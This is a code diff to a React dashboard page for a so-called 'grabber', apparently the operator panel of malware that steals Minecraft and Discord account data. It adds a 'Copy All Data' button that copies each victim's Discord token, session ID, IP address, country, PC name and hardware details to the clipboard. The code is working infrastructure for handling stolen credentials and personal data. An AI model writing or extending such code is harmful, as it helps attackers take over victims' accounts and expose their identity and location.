@@ -51,6 +51,7 @@ export default function GrabDetailPage() {
   const [grab, setGrab] = useState(null);
   const [loading, setLoading] = useState(true);
   const [deleting, setDeleting] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     fetch(`/api/grabs/${params.id}`)
@@ -63,6 +64,35 @@ export default function GrabDetailPage() {
     setDeleting(true);
     await fetch(`/api/grabs/${params.id}`, { method: 'DELETE' });
     router.push('/dashboard/grabs');
+  };
+
+  const handleCopyAll = () => {
+    const lines = [
+      `Minecraft Username: ${grab.minecraft_username}`,
+      `Discord Username: ${grab.discord_username}`,
+      `IP Address: ${grab.ip_address}`,
+      `Country: ${grab.country}`,
+      `Timezone: ${grab.timezone}`,
+      `OS: ${grab.os}`,
+      `OS Version: ${grab.os_version}`,
+      `PC Name: ${grab.pc_name}`,
+      `CPU: ${grab.cpu}`,
+      `RAM: ${grab.ram}`,
+      `GPU: ${grab.gpu}`,
+      `Screen: ${grab.screen_resolution}`,
+      `Disk: ${grab.disk_space}`,
+      `Java Version: ${grab.java_version}`,
+      `Language: ${grab.language}`,
+      `Desktop: ${grab.desktop_env}`,
+      `Client Version: ${grab.client_version}`,
+      `Session ID: ${grab.session_id}`,
+      `Session Start: ${grab.session_start}`,
+      `Discord Token: ${grab.discord_token}`,
+      `Servers: ${grab.servers}`,
+    ].filter(l => !l.endsWith(': ') && !l.endsWith(': null')).join('\n');
+    navigator.clipboard.writeText(lines);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   const mask = (val) => {
@@ -138,7 +168,12 @@ export default function GrabDetailPage() {
       <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
           <div onClick={() => router.push('/dashboard/grabs')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = colors.textDim}>← Back</div>
-          <div onClick={handleDelete} style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, transition: 'opacity 0.15s', opacity: deleting ? 0.5 : 1 }} onMouseEnter={e => e.target.style.opacity = 0.8} onMouseLeave={e => e.target.style.opacity = 1}>🗑 Delete</div>
+          <div style={{ display: 'flex', gap: 12 }}>
+            <div onClick={handleCopyAll} style={{ cursor: 'pointer', color: copied ? colors.green : colors.textDim, fontSize: 13, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = copied ? colors.green : colors.textDim}>
+              {copied ? '✓ Copied!' : '📋 Copy All Data'}
+            </div>
+            <div onClick={handleDelete} style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, transition: 'opacity 0.15s', opacity: deleting ? 0.5 : 1 }} onMouseEnter={e => e.target.style.opacity = 0.8} onMouseLeave={e => e.target.style.opacity = 1}>🗑 Delete</div>
+          </div>
         </div>
 
         <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 28 }}>
